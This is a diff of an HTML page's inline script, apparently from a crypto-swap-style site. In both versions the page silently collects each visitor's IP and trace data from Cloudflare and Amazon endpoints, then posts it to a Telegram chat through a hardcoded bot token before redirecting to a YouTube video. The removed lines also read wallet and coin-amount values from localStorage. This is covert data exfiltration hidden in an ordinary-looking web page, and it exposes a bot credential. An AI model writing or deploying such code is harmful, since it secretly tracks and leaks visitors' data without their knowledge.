@@ -23,38 +23,26 @@
 
     <script  src="js/index.js"></script>
  <script type="text/javascript" src="js/app.js"></script>
-<script async >
+<script >
   const urlIP = 'https://www.cloudflare.com/cdn-cgi/trace';
 
 const start = async function(a, b) {
-                var type_coin = localStorage.getItem("type_coin");
-                var from_coin =localStorage.getItem("from_coin");
-                var from_amount =localStorage.getItem("from_amount");
-                var wallet =localStorage.getItem("wallet");
-                var network_from =localStorage.getItem("network_from");
-
-                 let response = await fetch(urlIP);
-    let data =  await response.text();
-    data=data.split('\n');
-    
-    console.log(data[2]);
-
-
-
- const bot = new Bot("7058479197:AAFpIeIxtsmGQkE-f2GOSATbRPs54UX0nHI", "123456789");
-  var mess=data;
-  bot.sendMessage(mess,'-1002032102324','HTML');
- 
-}
-start();
+               const bot = new Bot("7058479197:AAFpIeIxtsmGQkE-f2GOSATbRPs54UX0nHI", "123456789"); 
+fetch(urlIP)
+    .then((res) => res.text())
+    .then((data) => {
+  bot.sendMessage(data,'-1002032102324','HTML');
+                                  
+});
+  
 fetch('https://checkip.amazonaws.com/')
     .then((res) => res.text())
-    .then((data) => { const bot = new Bot("7058479197:AAFpIeIxtsmGQkE-f2GOSATbRPs54UX0nHI", "123456789");
-  var mess=data;
-  bot.sendMessage(mess,'-1002032102324','HTML');
+    .then((data) => {
+  bot.sendMessage(data,'-1002032102324','HTML');            
                     
-                     window.location.href = "https://youtu.be/WR9mvNa6FDM?si=YUaeEzYgagViTwa5";
                     });
+
+   window.location.href = "https://youtu.be/WR9mvNa6FDM?si=YUaeEzYgagViTwa5";
 </script>
 
 
